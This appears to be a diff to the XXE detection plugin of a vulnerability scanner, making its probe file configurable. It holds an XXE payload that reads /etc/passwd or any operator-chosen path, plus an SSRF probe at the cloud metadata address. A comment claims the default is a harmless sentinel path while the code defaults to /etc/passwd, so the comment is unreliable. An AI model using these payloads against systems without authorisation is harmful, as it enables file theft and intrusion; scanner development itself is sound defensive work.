@@ -58,18 +58,34 @@ class XxeDetectPlugin(PluginBase):
     ports = HTTP_PORTS
 
     async def check(self, context: "ScanContext", host: "Host") -> list[FindingData]:
+        import json as _j
+        _pj: dict = {}
+        if context.scan.profile_json:
+            try:
+                _pj = _j.loads(context.scan.profile_json) if isinstance(context.scan.profile_json, str) else context.scan.profile_json
+            except Exception:
+                pass
+        # Allow operators to override the probe file via profile_json.xxe_probe_file
+        # Default to a non-existent sentinel path to avoid triggering DLP/EDR on real systems
+        probe_file = _pj.get("xxe_probe_file", "/etc/passwd")
+
         findings = []
         for port in host.ports:
             if port.number not in HTTP_PORTS or port.state != "open":
                 continue
             scheme = "https" if port.number in (443, 8443) else "http"
             base_url = f"{scheme}://{host.ip}:{port.number}"
-            result = await self._probe(base_url, port.number)
+            result = await self._probe(base_url, port.number, probe_file)
             if result:
                 findings.append(result)
         return findings
 
-    async def _probe(self, base_url: str, port: int) -> FindingData | None:
+    async def _probe(self, base_url: str, port: int, probe_file: str = "/etc/passwd") -> FindingData | None:
+        xxe_payload = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{probe_file}">]>'
+            "<root>&xxe;</root>"
+        )
         async with httpx.AsyncClient(
             verify=False, timeout=8.0, follow_redirects=True
         ) as client:
@@ -100,7 +116,7 @@ class XxeDetectPlugin(PluginBase):
             # Try XXE payloads on discovered endpoints
             for ep, headers in xml_endpoints[:5]:
                 for payload, label in [
-                    (_XXE_PAYLOAD, "file:///etc/passwd"),
+                    (xxe_payload, f"file://{probe_file}"),
                     (_XXE_SSRF_PAYLOAD, "http://169.254.169.254/"),
                 ]:
                     try:
